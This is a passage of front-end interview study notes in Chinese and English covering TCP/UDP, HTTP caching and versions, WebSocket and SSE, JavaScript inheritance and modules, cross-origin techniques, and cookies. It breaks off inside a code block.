# Links

![](https://www.google.com/s2/favicons?domain=www.zhihu.com)[webpack 面试 - 搜索结果 - 知乎](https://www.zhihu.com/search?type=content&q=webpack%20面试)

![](https://www.google.com/s2/favicons?domain=www.zhihu.com)[event loop - 搜索结果 - 知乎](https://www.zhihu.com/search?type=content&q=event%20loop)

![](https://www.google.com/s2/favicons?domain=www.zhihu.com)[前端押题 - 搜索结果 - 知乎](https://www.zhihu.com/search?type=content&q=前端押题)

![](https://www.google.com/s2/favicons?domain=www.nowcoder.com)[近期前端面经合集_笔经面经_牛客网](https://www.nowcoder.com/discuss/144472)

![](https://www.google.com/s2/favicons?domain=github.com)[Daily-Interview-Question/summary.md at master · Advanced-Frontend/Daily-Interview-Question · GitHub](https://github.com/Advanced-Frontend/Daily-Interview-Question/blob/master/datum/summary.md#第-12-题js-异步解决方案的发展历程以及优缺点)

![](https://www.google.com/s2/favicons?domain=github.com)[GitHub - huyaocode/webKnowledge: 前端知识点总结](https://github.com/huyaocode/webKnowledge)

![](https://www.google.com/s2/favicons?domain=github.com)[front-end-interview-handbook/README.md at master · yangshun/front-end-interview-handbook · GitHub](https://github.com/yangshun/front-end-interview-handbook/blob/master/Translations/Chinese/README.md)

![](https://www.google.com/s2/favicons?domain=github.com)[GitHub - fex-team/interview-questions: FEX 面试问题](https://github.com/fex-team/interview-questions)

![](https://www.google.com/s2/favicons?domain=github.com)[GitHub - CyC2018/CS-Notes: 😋 技术面试必备基础知识](https://github.com/CyC2018/CS-Notes)

![](https://www.google.com/s2/favicons?domain=github.com)[GitHub - airuikun/blog: 小蝌蚪的blog，中年前端屌丝的心路历程，欢迎star或者watch](https://github.com/airuikun/blog)

![](https://www.google.com/s2/favicons?domain=github.com)[GitHub - airuikun/Weekly-FE-Interview: 每周十道前端大厂面试题，并收集大家在大厂面试中遇到的难题，一起共同成长。](https://github.com/airuikun/Weekly-FE-Interview)

# Network

## 交换, TCP, UDP

1. 电路交换，报文交换，分组交换
   - 电路交换的独占性质，需要先在底层建立链接，传送信息期间独占电路
   - 报文交换就是一次性传送，不建立连接，中间路由器利用报文的首部地址传送到下一个路由器，直到终点，
   - 分组交换就是把报文分组，多次传送

1. [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol)
   - 三次握手  
     ![][p6]

     [p6]: ./images/6.png
     - 三次握手的第三次握手发送ACK能携带数据吗？如何携带？怎样体现的呢？
       - TCP标准规定，第三次握手的报文，可以携带数据。需系统内核支持???
       - 为了提高效率，减少IP包的数目，最大可能地将信令数据、应用数据合二为一。一个TCP连接，除了第一个SYN包，每个TCP报文都有ACK信令
     - 为什么第三次
       - 防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误
   - 四次挥手  
     ![][p7]

     [p7]: ./images/7.png
     - It is also possible to terminate the connection by a 3-way handshake, when host A sends a FIN and host B replies with a FIN & ACK (merely combines 2 steps into one) and host A replies with an ACK.
     - 四次挥手的原因
       - 客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。
     - TIME_WAIT — 客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由：
       - 确保最后一个确认报文能够到达。如果 B 没收到 A 发送来的确认报文，那么就会重新发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。
       - 等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。
   - Congestion control — four intertwined algorithms: slow-start, congestion avoidance, fast retransmit, and fast recovery
     - slow start — begins initially with a congestion window size (cwnd) of 1, 2, 4 or 10 MSS (maximum segment size). The value for the congestion window size will be increased by one with each acknowledgement (ACK) received, effectively doubling the window size each round-trip time. The transmission rate will be increased by the slow-start algorithm until either a loss is detected, or the receiver's advertised window (rwnd) is the limiting factor, or ssthresh (slow start threshold) is reached. If a loss event occurs, TCP assumes that it is due to network congestion and takes steps to reduce the offered load on the network. These measurements depend on the exact TCP congestion avoidance algorithm used.
     - congestion avoidance — Once ssthresh is reached, TCP changes from slow-start algorithm to the linear growth (congestion avoidance) algorithm. At this point, the window is increased by 1 segment for each round-trip delay time (RTT).
     - fast retransmit — reduces the time a sender waits before retransmitting a lost segment
       - If an acknowledgement is not received for a particular segment within a specified time (a function of the estimated round-trip delay time), the sender will assume the segment was lost in the network, and will retransmit the segment.
       - Duplicate acknowledgement is the basis for the fast retransmit mechanism. After receiving a packet (e.g. with sequence number 1), the receiver sends an acknowledgement by adding 1 to the sequence number (i.e. acknowledgement number 2). This indicates to the sender that the receiver received the packet number 1 and it expects packet number 2. Suppose that three subsequent packets are lost. The next packets the receiver sees are packet numbers 5 and 6. After receiving packet number 5, the receiver sends an acknowledgement, but still only for sequence number 2. When the receiver receives packet number 6, it sends yet another acknowledgement value of 2. Duplicate acknowledgement occurs when the sender receives more than one acknowledgement with the same sequence number (2 in this example).
       - When a sender receives several duplicate acknowledgements, it can be reasonably confident that the segment with the next higher sequence number was dropped. A sender with fast retransmit will then retransmit this packet immediately without waiting for its timeout.
       - TCP Reno 3个包？ 因为数据包在网络可能乱序到达，因此定义网络乱序度3，超过3个duplicated ack才判断丢包。
     - fast recovery (TCP Reno) — A fast retransmit is sent, half of the current CWND is saved as ssthresh and as new CWND, thus skipping slow start and going directly to the congestion avoidance algorithm. The overall algorithm here is called fast recovery.
     - Vulnerabilities
       - Denial of service — By using a spoofed IP address and repeatedly sending purposely assembled SYN packets, followed by many ACK packets, attackers can cause the server to consume large amounts of resources keeping track of the bogus connections. This is known as a SYN flood attack.
       - Connection hijacking — An attacker who is able to eavesdrop a TCP session and redirect packets can hijack a TCP connection. To do so, the attacker learns the sequence number from the ongoing communication and forges a false segment that looks like the next segment in the stream. Such a simple hijack can result in one packet being erroneously accepted at one end. When the receiving host acknowledges the extra segment to the other side of the connection, synchronization is lost.
       - TCP veto — An attacker who can eavesdrop and predict the size of the next packet to be sent can cause the receiver to accept a malicious payload without disrupting the existing connection. The attacker injects a malicious packet with the sequence number and a payload size of the next expected packet. When the legitimate packet is ultimately received, it is found to have the same sequence number and length as a packet already received and is silently dropped as a normal duplicate packet—the legitimate packet is "vetoed" by the malicious packet.

1. [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol)
   - UDP uses a simple connectionless communication model with a minimum of protocol mechanism. UDP provides checksums for data integrity, and port numbers for addressing different functions at the source and destination of the datagram. It has no handshaking dialogues, and thus exposes the user's program to any unreliability of the underlying network; there is no guarantee of delivery, ordering, or duplicate protection.
   - If transmission reliability is desired, it must be implemented in the user's application.
   - attributes
     - It is transaction-oriented, suitable for simple query-response protocols such as the Domain Name System or the Network Time Protocol.
     - It provides datagrams, suitable for modeling other protocols such as IP tunneling or remote procedure call and the Network File System.
     - It is simple, suitable for bootstrapping or other purposes without a full protocol stack, such as the DHCP and Trivial File Transfer Protocol.
     - It is stateless, suitable for very large numbers of clients, such as in streaming media applications such as IPTV.
     - The lack of retransmission delays makes it suitable for real-time applications such as Voice over IP, online games, and many protocols using Real Time Streaming Protocol.
     - it supports multicast
   - 小结TCP与UDP的区别：
     1. 基于连接与无连接；
     2. 对系统资源的要求（TCP较多，UDP少）；
     3. UDP程序结构较简单；
     4. 流模式与数据报模式 ；
     5. TCP保证数据正确性，UDP可能丢包；
     6. TCP保证数据顺序，UDP不保证。

1. socket — socket是一种"打开—读/写—关闭"模式的实现，服务器和客户端各自维护一个"文件"，在建立连接打开后，可以向自己文件写入内容供对方读取或者读取对方内容，通讯结束时关闭文件

## HTTP

1. version history
   - HTTP/0.9时代：短连接
     - 每个HTTP请求都要经历一次DNS解析、三次握手、传输和四次挥手。反复创建和断开TCP连接的开销巨大，在现在看来，这种传输方式简直是糟糕透顶。
   - HTTP/1.0时代：持久连接概念提出
     - 人们认识到短连接的弊端，提出了持久连接的概念，在HTTP/1.0中得到了初步的支持。持久连接，即一个TCP连接服务多次请求：客户端在请求header中携带Connection: Keep-Alive，即是在向服务端请求持久连接。如果服务端接受持久连接，则会在响应header中同样携带Connection: Keep-Alive，这样客户端便会继续使用同一个TCP连接发送接下来的若干请求。（Keep-Alive的默认参数是[timout=5, max=100]，即一个TCP连接可以服务至多5秒内的100次请求）
     - 当服务端主动切断一个持久连接时（或服务端不支持持久连接），则会在header中携带Connection: Close，要求客户端停止使用这一连接。
   - HTTP/1.1时代：持久连接成为默认的连接方式；提出pipelining概念
     - HTTP/1.1开始，即使请求header中没有携带Connection: Keep-Alive，传输也会默认以持久连接的方式进行。
     - 持久连接的弊端被提出 —— HOLB（Head of Line Blocking）: 即持久连接下一个连接中的请求仍然是串行的，如果某个请求出现网络阻塞等问题，会导致同一条连接上的后续请求被阻塞。
     - 提出了pipelining概念，即客户端可以在一个请求发送完成后不等待响应便直接发起第二个请求，服务端在返回响应时会按请求到达的顺序依次返回。响应仍然是按请求的顺序串行返回的。所以pipelining并没有被广泛接受，几乎所有代理服务都不支持pipelining，部分浏览器不支持pipelining，支持的大部分也会将其默认关闭
   - SPDY和HTTP/2：multiplexing — multiplexing即多路复用，在SPDY中提出，同时也在HTTP/2中实现。multiplexing技术能够让多个请求和响应的传输完全混杂在一起进行，通过streamId来互相区别。这彻底解决了holb问题，同时还允许给每个请求设置优先级，服务端会先响应优先级高的请求。
     - [multiplexing](https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/14)

1. 缓存
   - [blog](https://www.jianshu.com/p/54cc04190252)
   - `<meta>`标签控制???
   - HTTP header  
     ![][p1]

     [p1]: ./images/1.png
     - 强缓存 — 可以理解为无须验证的缓存策略。对强缓存来说，响应头中有两个字段 Expires/Cache-Control 来表明规则。
       - Expires — 指缓存过期的时间，超过了这个时间点就代表资源过期。有一个问题是由于使用具体时间，如果时间表示出错或者没有转换到正确的时区都可能造成缓存生命周期出错。并且 Expires 是 HTTP/1.0 的标准，现在更倾向于用 HTTP/1.1 中定义的 Cache-Control。两个同时存在时也是 Cache-Control 的优先级更高。
       - Cache-Control — Cache-Control 可以由多个字段组合而成
         1. max-age 指定一个时间长度，在这个时间段内缓存是有效的，单位是s。例如设置 Cache-Control:max-age=31536000
         2. s-maxage 同 max-age，覆盖 max-age、Expires，但仅适用于共享缓存，在私有缓存中被忽略。
         3. public 表明响应可以被任何对象（发送请求的客户端、代理服务器等等）缓存。
         4. private 表明响应只能被单个用户（可能是操作系统用户、浏览器用户）缓存，是非共享的，不能被代理服务器缓存。
         5. no-cache 强制所有缓存了该响应的用户，在使用已缓存的数据前，发送带验证器的请求到服务器。不是字面意思上的不缓存。
         6. no-store 禁止缓存，每次请求都要向服务器重新获取数据。
     - 协商缓存 — 客户端和服务器端通过某种验证机制验证当前请求资源是否可以使用缓存
       - Last-modified/If-Modified-Since
         - Last-modified: 服务器端资源的最后修改时间，响应头部会带上这个标识。第一次请求之后，浏览器记录这个时间
         - 再次请求时，请求头部带上 If-Modified-Since 即为之前记录下的时间。服务器端收到带 If-Modified-Since 的请求后会去和资源的最后修改时间对比。若修改过就返回最新资源，状态码 200，若没有修改过则返回 304 Not Modified。
       - Etag/If-None-Match — 由服务器端上生成的一段 hash 字符串，第一次请求时响应头带上 ETag: abcd，之后的请求中带上 If-None-Match: abcd，服务器检查 ETag，返回 304 或 200。
       - 区别
         - 某些服务器不能精确得到资源的最后修改时间，这样就无法通过最后修改时间判断资源是否更新。
         - Last-modified 只能精确到秒。
         - 一些资源的最后修改时间改变了，但是内容没改变，使用 Last-modified 看不出内容没有改变。
         - Etag 的精度比 Last-modified 高，属于强验证，要求资源字节级别的一致，优先级高。如果服务器端有提供 ETag 的话，必须先对 ETag 进行 Conditional Request。
         - 实际使用 ETag/Last-modified 要注意保持一致性，做负载均衡和反向代理的话可能会出现不一致的情况。计算 ETag 也是需要占用资源的，如果修改不是过于频繁，看自己的需求用 Cache-Control 是否可以满足。
   - 其他 — 打包出来文件带hash后缀或版本号，文件内容改变后相当于请求一个新文件

1. GET and POST
   - 语义： 请求数据 vs 提交数据
   - 一个请求参数在URL，一个在body
     - 浏览器支持的URL长度有限
   - 幂等，不幂等
     - 一次和多次请求某一个资源应该具有同样的副作用

## short, long poll

1. short, long poll, HTTP streaming
   - short polling: where the browser sends a request to the server in regular intervals to see if there’s any data
   - Long polling flips short polling around: The page initiates a request to the server and the server holds that connection open until it has data to send
   - HTTP streaming
     - uses a single HTTP connection for the entire lifetime of the page
     - The browser sends a request to the server and the server holds that connection open, periodically sending data through the connection to the server
     - printing to the output buffer and then flushing (sending the contents of the output buffer to the client). This is the core of HTTP streaming
     - client side: listening for the `readystatechange` event and focusing on `readyState` 3, keep track of the progress and slice the response

1. server-sent events — `EventSource`
   - no IE and Edge support
   - instance opens a persistent connection to an HTTP server, which sends events in `text/event-stream` format (MIME type)
     - If the connection is closed, a reconnect is attempted
     - The connection remains open until closed by calling `EventSource.close()`
   - Once the connection is opened, incoming messages from the server are delivered to your code in the form of [`message`](#sec-message-events) events
   - unidirectional: from the server to the client
   - constructor: `EventSource(url: string, EventSourceInitDict?: EventSourceInit)`
     - EventSourceInit: `withCredentials` property defaults to `false`
   - properties
     - `EventSource.readyState` Read only — A number representing the state of the connection. Possible values are `EventSource.CONNECTING` (0), `OPEN` (1), or `CLOSED` (2)
     - `EventSource.url` Read only — A `DOMString` representing the URL of the source
     - `EventSource.withCredentials` Read only — A Boolean indicating whether the EventSource object was instantiated with cross-origin (CORS) credentials set (`true`), or not (`false`, the default)
   - Event handlers
     - `EventSource.onerror` — interface is `Event`, not `UIEvent` nor `ProgressEvent`
     - `EventSource.onmessage` — interface is `MessageEvent`
     - `EventSource.onopen` — a connection with an event source is opened, interface is `Event`
   - methods
     - `EventSource.close()` — Closes the connection, if any, and sets the `readyState` attribute to `CLOSED`. If the connection is already closed, the method does nothing

1. `WebSocket`
   - provide full-duplex, bidirectional communication with the server over a single, long-lasting connection
     - send messages to a server and receive event-driven responses without having to poll the server for a reply
   - smaller overhead than HTTP
   - The same-origin policy does not apply to Web Sockets
   - When a Web Socket is created in JavaScript, an HTTP request is sent to the server to initiate a connection. When the server responds, the connection uses HTTP upgrade to switch from HTTP to the Web Socket protocol
   - constructor: `WebSocket(url, protocol?)`
     - connection is established upon construct
     - url example: `ws://localhost:8080`, `wss://localhost:8080` (secured)
     - protocol defaults to `''`
   - properties
     - [MDN](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket#Properties)
     - `WebSocket.binaryType` — The binary data type used by the connection
     - `WebSocket.bufferedAmount` Read only — The number of bytes of queued data
     - `WebSocket.extensions` Read only — The extensions selected by the server
     - `WebSocket.protocol` Read only — The sub-protocol selected by the server
     - `WebSocket.readyState` Read only — The current state of the connection
       - `WebSocket.OPENING` (0) — The connection is being established
       - `WebSocket.OPEN` (1) — The connection has been established
       - `WebSocket.CLOSING` (2) — The connection is beginning to close
       - `WebSocket.CLOSE` (3) — The connection is closed
     - `WebSocket.url` Read only — The absolute URL of the WebSocket
   - handler properties
     - `WebSocket.onclose` — An event listener to be called when the connection is closed
       - `CloseEvent`
     - `WebSocket.onerror` — An event listener to be called when an error occurs
       - interface: `Event`
     - `WebSocket.onmessage` — An event listener to be called when a message is received from the server
       - see before `MessageEvent`
     - `WebSocket.onopen` — An event listener to be called when the connection is opened
       - interface: `Event`
   - Methods
     - `WebSocket.close([code[, reason]])` — Closes the connection
     - `WebSocket.send(data)` — Enqueues data to be transmitted
       - `data: USVString | Blob | ArrayBuffer | ArrayBufferView`

1. fetch — Concepts and usage
   - At the heart of Fetch
     - are the Interface abstractions of HTTP `Request`s, `Response`s, `Headers`, and `Body` payloads, along with a global `fetch()` method for initiating asynchronous resource requests
     - completely `Promise`-based
   - It will seem familiar to anyone who has used `XMLHttpRequest`, but the new API provides a more powerful and flexible feature set
   - implemented in multiple interfaces, specifically `Window` and `WorkerGlobalScope`

# JS

## Miscellanea

1. `==`
   - 对象转原始值
   - 原始值转数字
   - `Array` 的`valueOf`方法返回原对象，故调用`toString()`，`[]`变为空字符再变成0，`[n]`变成`'n'`再变成数字，其他变成NaN
     - `Number({})`返回NaN
   - `null == undefined`

1. `Number`
   - `Number.MAX_SAFE_INTEGER`, `Number.MIN_SAFE_INTEGER`
     - The reasoning behind that number is that JavaScript uses double-precision floating-point format numbers as specified in IEEE 754 and can only safely represent numbers between -(2^53^ - 1) and 2^53^ - 1
     - Safe in this context refers to the ability to represent integers exactly and to correctly compare them. For example, `Number.MAX_SAFE_INTEGER + 1 === Number.MAX_SAFE_INTEGER + 2` will evaluate to `true`
   - `Number.MAX_VALUE`, `Number.MIN_VALUE` — 2^1024^

1. closure — 当一个函数被创建并传递或从另一个函数返回时，它会携带一个背包。背包中是函数声明时作用域内的所有变量。

1. module
   - [github](https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/28)
   - CommonJS
     - 同步加载
     - CommonJS是一个更偏向于服务器端的规范。NodeJS采用了这个规范。CommonJS的一个模块就是一个脚本文件。require命令第一次加载该脚本时就会执行整个脚本，然后在内存中生成一个对象。
     - id是模块名，exports是该模块导出的接口，loaded表示模块是否加载完毕。此外还有很多属性，这里省略了。 以后需要用到这个模块时，就会到exports属性上取值。即使再次执行require命令，也不会再次执行该模块，而是到缓存中取值。
   - AMD
     - ”Asynchronous Module Definition”的缩写，即”异步模块定义”。它采用异步方式加载模块，模块的加载不影响它后面语句的运行。 这里异步指的是不堵塞浏览器其他任务（dom构建，css渲染等），而加载内部是同步的（加载完模块后立即执行回调）。
     - `require`第一个参数`[module]`，是一个数组，里面的成员是要加载的模块，`callback` 是加载完成后的回调函数
     - 模块必须按照AMD规定的方式来写。 具体来说，就是模块书写必须使用特定的 `define()` 函数来定义。
     - 依赖前置，先加载 dependency
   - CMD
     - 支持动态引入依赖文件。
     - 依赖就近，延迟执行, 可以把你的依赖写进代码的任意一行
   - UMD — 兼容不同的加载规范
   - ES6
     - ES6 模块输出的是值的引用，输出接口动态绑定，而 CommonJS 输出的是值的拷贝
     - ES6 模块编译时执行，而 CommonJS 模块总是在运行时加载
       - import 命令会被 JavaScript 引擎静态分析，优先于模块内的其他内容执行。加载请求的变量，其他不加载
       - export 命令会有变量声明提前的效果。
     - 动态`import()`提案

1. 性能优化
   - 加载与执行
     - 底部或defer
     - 动态加载 — `<script>`, xhr
     - js文件合并
   - 减少作用域嵌套
   - 批量修改DOM：脱离——修改——放回
     - 隐藏元素
     - `document.createDocumentFragment()`
     - `Node.cloneNode(true)`
   - 事件委托

1. 防抖、截流函数

1. 模块循环加载
   - [blog](http://www.ruanyifeng.com/blog/2015/11/circular-dependency.html)

1. 垃圾回收
   - [blog](https://segmentfault.com/a/1190000000440270)

## inheritance

1. prototype chain  
   ![][p5]

   [p5]: ./images/5.png
   - `person.__proto__` 指向 Person.prototype
   - person.constructor 指向 Person 类，因为该对象的构造函数就是 Person
   - person.constructor.prototype 也就是 Person.prototype
   - Person.prototype.constructor 指向 Person 自己
   - Person.constructor 指向 Function
   - `Person.__proto__` 指向 Function.prototype
   - `Person.prototype.__proto__` 指向 Object.prototype
   - Object 实例对象的 constructor 指向 Object.prototype.constructor (`Object.prototype.constructor === Object`)
   - `Object.prototype.__proto__` 是 null
   - 总结
     - 实例对象的 `__proto__` 指向类（构造函数）的 prototype
     - 实例对象的 constructor 指向类（构造函数）本身
     - 类（构造函数）的 `__proto__` 指向父类或者 Function 的 prototype
     - Function 的基类是 Object
     - 特别的 `Object.__proto__` 指向一个空函数 (`new Object.__proto__.constructor()` 返回匿名空函数)
     - 特别的 `Object.prototype.__proto__` 是 null

1. Prototype Chaining
   ```JavaScript
   SubType.prototype = new SuperType();
   ```
   - 优点：
     - 简单易于实现，父类的新增的实例与属性子类都能访问
   - 缺点：
     - 可以在子类中增加实例属性，如果要新增加原型属性和方法需要在new 父类构造函数的后面
     - 无法实现多继承
     - 创建子类实例时，不能向父类构造函数中传参数

1. constructor stealing
   ```JavaScript
   function SubType(){
     SuperType.call(this);
   }
   ```
   - 优点：
     - 解决了子类构造函数向父类构造函数中传递参数
     - 可以实现多继承（call或者apply多个父类）
   - 缺点：
     - 方法都在构造函数中定义，无法复用
     - 不能继承父类原型属性/方法，只能继承父类的实例属性和方法

1. Combination Inheritance — prototype Chaining + constructor stealing
   - 缺点：
     - 由于调用了两次父类，所以产生了两份实例
   - 优点：
     - 函数可以复用
     - 不存在引用属性问题
     - 可以继承属性和方法，并且可以继承原型的属性和方法

1. Prototypal Inheritance and Parasitic Inheritance
   ```JavaScript
   Object.create(proto)
   // or
   function object(o){
     function F(){}
     F.prototype = o;
     return new F();
   }
   ```

   Parasitic Inheritance
   ```JavaScript
   function createAnother(original){
     const clone = Object.create(original); //create a new object by calling a function
     clone.someProperty = ... //augment the object in some way
     return clone; //return the object
   }
   ```

1. Parasitic Combination Inheritance
   ```JavaScript
   function inheritPrototype(subType, superType){
     const prototype = Object.create(superType.prototype); //create object
     prototype.constructor = subType; //augment object
     subType.prototype = prototype; //assign object
   }
   function SubType(name, age){
     SuperType.call(this, name);
     this.age = age;
   }
   inheritPrototype(SubType, SuperType);
   ```

1. es6
   - 类的所有方法都定义在类的prototype属性上面, 都是不可枚举的（non-enumerable）
   - 静态方法定义在类本身上
   - 属性可在`constructor()`中定义或单独先定义
   - 继承区别
     - es5继承首先是在子类中创建自己的this指向，最后将方法添加到this中
     - es6继承是使用关键字先创建父类的实例对象this，最后在子类class中修改this，如果不调用super方法，子类就得不到this对象

## 跨域

1. CORS
   1. Cross-Origin Resource Sharing (CORS)
      - same-origin policy: Normally, scripts on different pages are allowed to access each other if and only if the pages they originate from share the same protocol, port number, and host
      - a mechanism that uses additional HTTP headers to tell a browser to let a web application running at one origin (domain) have permission to access selected resources from a server at a different origin
      - A web application makes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, and port) than its own origin
      - preflight: for HTTP request methods that can cause side-effects on server's data, the specification mandates that browsers "preflight" the request, soliciting supported methods from the server with an HTTP OPTIONS request method, and then, upon "approval" from the server, sending the actual request with the actual HTTP request method
        - Servers can also notify clients whether "credentials" (including Cookies and HTTP Authentication data) should be sent with requests
      - CORS failures result in errors, but for security reasons, specifics about what went wrong are not available to JavaScript code, can only check browser console
      - access
        - Cross-origin writes are typically allowed. Examples are links, redirects, and form submissions. Some HTTP requests require preflight.
        - Cross-origin embedding is typically allowed. (Examples are listed below.)
        - Cross-origin reads are typically disallowed, but read access is often leaked by embedding. For example, you can read the dimensions of an embedded image, the actions of an embedded script, or the availability of an embedded resource
   1. Simple requests, A request that doesn’t trigger a CORS preflight
      - The only allowed methods are: GET HEAD POST
      - Apart from the headers set automatically by the user agent, the only headers which are allowed to be manually set are
        - Accept, Accept-Language, Content-Language, DPR, Downlink, Save-Data, Viewport-Width, Width
        - Content-Type with
          - `application/x-www-form-urlencoded`
          - `multipart/form-data`
          - `text/plain`
      - No event listeners are registered on any `XMLHttpRequestUpload` object used in the request
      - a `ReadableStream` object cannot be used in the request
      - additional headers
        - request sent with `Origin` header
        - response received with `Access-Control-Allow-Origin` header, `*` if allow all sites
   1. Preflight requests
      - no IE10 and before
      - when not a simple request, a “preflight” request is made to the server, then the main request
      - preflight — OPTIONS method and sends the following headers:
        - Origin — Same as in simple requests.
        - Access-Control-Request-Method — The method that the request wants to use.
        - Access-Control-Request-Headers — (Optional) A comma-separated list of the custom headers being used.
      - additional headers of server response to preflight
        - Access-Control-Allow-Origin — Same as in simple requests
        - Access-Control-Allow-Methods — A comma-separated list of allowed methods
        - Access-Control-Allow-Headers — A comma-separated list of headers that the server will allow
        - Access-Control-Max-Age — The amount of time in seconds that this preflight request should be cached for

1. JSONP, JSON with padding: dynamic script
   ```javascript
   function handleResponse(response){
       alert("You’re at IP address " + response.ip + ", which is in " +
   response.city + ", " + response.region_name);
   }
   var script = document.createElement("script");
   script.src = "http://freegeoip.net/json/?callback=handleResponse";
   document.body.insertBefore(script, document.body.firstChild);
   ```
   - unsafe

1. Server Proxy: 服务器代理，顾名思义，当你需要有跨域的请求操作时发送请求给后端，让后端帮你代为请求，然后最后将获取的结果发送给你。

1. `WebSocket`

1. iframe 信息传递
   - `location.hash`，改变 hash 值不会导致页面刷新，所以可以利用 hash 值来进行数据的传递，当然数据量是有限的。
     - 假设 localhost:8080 下有文件 cs1.html 要和 localhost:8081 下的 cs2.html 传递消息，cs1.html 首先创建一个隐藏的 iframe，iframe 的 src 指向 localhost:8081/cs2.html#data，这时的 hash 值就可以做参数传递。
   - `window.name` — 在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的 name 值（2MB）
     ```JavaScript
     // code on a.html
     ifr.onload = function() { // this points to b.html
         ifr.onload = function() { // points to c.html
             data = ifr.contentWindow.name;
             console.log('收到数据:', data);
         }
         ifr.src = "http://localhost:8080/c.html"; // something origin-source as a.html
     }
     ```

1. Cross-document messaging, XDM
   - a `MessageEvent` is dispatched at the target window when message posted
   - `Window.postMessage(message: any, targetOrigin: string, transfer?: any[]): void`
     - obtain `window` reference
       - `Window.open()` (to spawn a new window and then reference it),
       - `Window.opener` (to reference the window that spawned this one),
       - `HTMLIFrameElement.contentWindow` (to reference an embedded `<iframe>` from its parent window),
       - `Window.parent` (to reference the parent window from within an embedded `<iframe>),` or
       - `Window.frames` + an index value (named or numeric)
     - `message` — Data to be sent to the other window. The data is serialized using the structured clone algorithm
     - `targetOrigin` — Specifies what the origin of targetWindow must be for the event to be dispatched
       - a URI or `"*"` for any
       - Failing to provide a specific target discloses the data you send to any interested malicious site
       - posting a message to a page at a `file:` URL currently requires that the `targetOrigin` argument be `"*"`
     - `transfer` — Is a sequence of `Transferable` objects that are transferred with the message
       - The ownership of these objects is given to the destination side and they are no longer usable on the sending side
       - The `ArrayBuffer`, `MessagePort` and `ImageBitmap` types implement this interface
   - The structured clone algorithm
     - defined by the HTML5 specification for copying complex JavaScript objects
     - can avoid infinitely traversing cycles
     - `DATA_CLONE_ERR` exception
       - `Error` and `Function` objects
       - `Symbol`
       - DOM nodes
     - Certain parameters of objects are not preserved:
       - The `lastIndex` field of `RegExp` objects is not preserved.
       - Property descriptors, setters, and getters (as well as similar metadata-like features) are not duplicated. For example, if an object is marked read-only using a property descriptor, it will be read-write in the duplicate, since that's the default condition.
       - The prototype chain does not get walked and duplicated
   - handle the event: see [events](#sec-message-events)
   - schedules the `MessageEvent` to be dispatched only after all pending execution contexts have finished
     - For example, if `postMessage()` is invoked in an event handler, that event handler will run to completion, as will any remaining handlers for that same event, before the `MessageEvent` is dispatched

1. document.domain：对于主域相同而子域不同的情况下，可以通过设置 document.domain 的办法来解决，具体做法是可以在 `http://www.example.com/a.html` 和 `http://sub.example.com/b.html` 两个文件分别加上 document.domain = "a.com"；然后通过 a.html 文件创建一个 iframe，去控制 iframe 的 window，从而进行交互，当然这种方法只能解决主域相同而二级域名不同的情况

## Cookies, the old fashioned way

1. `Navigator.cookieEnabled` Read only

1. HTTP cookies
   - `Set-Cookie`
     - When receiving an HTTP request, a server can send a Set-Cookie header with the response
       ```
       HTTP/1.0 200 OK
       Content-type: text/html
       Set-Cookie: yummy_cookie=chocolate
       Set-Cookie: tasty_cookie=strawberry
       ```

     - Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the Cookie header
       ```
       GET /sample_page.html HTTP/1.1
       Host: www.example.org
       Cookie: yummy_cookie=choco; tasty_cookie=strawberry
       ```
     - `__Secure-` prefix: Cookies with a name starting with `__Secure-` (dash is part of the prefix) must be set with the `secure` flag and must be from a secure page (HTTPS).
     - `__Host-` prefix: Cookies with a name starting with `__Host-` must be set with the `secure` flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore aren't sent to subdomains) and the path must be "/".
     - subcookies: `name=name1=value1&name2=value2&name3=value3`
   - Session cookies
     - default setting for cookies
     - deleted when the client shuts down
   - Permanent cookies — expire at a specific date (`Expires`) or after a specific length of time in seconds (`Max-Age`)
     ```
     Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
     ```

     - the time and date set is relative to the client
     - `Max-Age` has precedence
   - security flags
     ```
     Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
     ```

     - `Secure`: HTTPS only
     - `HttpOnly`: cookies are inaccessible to JavaScript's `Document.cookie` API
   - `SameSite` experimental: a cookie shouldn't be sent with cross-site requests
     - `=Strict` — prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link
     - `=Lax` — only send cookies for TOP LEVEL navigation GET requests. This is sufficient for user tracking, but it will prevent many CSRF attacks
   - Scope of cookies
     - `Domain` — allowed hosts to receive the cookie
       - If unspecified, it defaults to the host of the current document location, excluding subdomains
       - if specified, subdomains are always included
       - a domain that does not include the origin server should be rejected by the user agent
     - `Path` — indicates a URL path that must exist in the requested URL in order to send the `Cookie` header
       - for example: `Path=/docs`
       - only absolute paths, no `..` or `.`

1. `Document.cookie: string` — Read all cookies (URI encoded)
   - Write a new cookie — `document.cookie = 'key=value'`
     - coordination: `encodeURIComponent()`
     - optional followed by attributes
     - `Date.toUTCString()` when setting `Expires`
   - simple framework — [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie/Simple_document.cookie_framework)
   - get
     ```javascript
     function (sKey) {
         if (!sKey) { return null; }
         return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
     }
     ```

   - remove — set `Expires` to past (`Thu, 01 Jan 1970 00:00:00 GMT`) or set `Max-Age` to non-positive
     ```javascript
